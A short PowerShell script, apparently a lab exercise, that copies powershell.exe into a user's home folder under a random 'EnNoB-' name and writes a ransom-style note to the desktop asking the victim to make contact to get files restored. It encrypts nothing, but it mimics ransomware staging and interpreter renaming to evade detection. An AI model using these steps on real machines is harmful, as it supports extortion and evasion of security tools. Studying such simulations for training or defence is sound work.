# Create a random number to add to the file
$sbRand = Get-random -Minimum 1000 -Maximum 9876

# Copy powershell.exe to home directory
Copy-Item -Path "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination "C:\Users\mikep\"

# Filename
$filename = "EnNoB-" + $sbRand + ".exe"

# Rename powershell.exe to EnNoB-X.exe
Rename-item -Path "C:\Users\mikep\powershell.exe" -NewName $filename

$outputName = "C:\Users\mikep\" + $filename

# Check to see if file exists
if (Test-path $outputName ) {

    write-host -backgroundcolor "Green" -foregroundcolor "White" "File was found!"

} else {

    write-host -backgroundcolor "Red" -foregroundcolor "White" "Error: File not found!"
}

$message = "If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you."

# Creates the readme file
$message | Out-File -FilePath "C:\Users\mikep\Desktop\Readme.READ"

$outputName2 = "C:\Users\mikep\Desktop\Readme.READ"

# Check to see if file exists
if (Test-path $outputName2 ) {

    write-host -backgroundcolor "Green" -foregroundcolor "White" "File was found!"

} else {

    write-host -backgroundcolor "Red" -foregroundcolor "White" "Error: File not found!"
}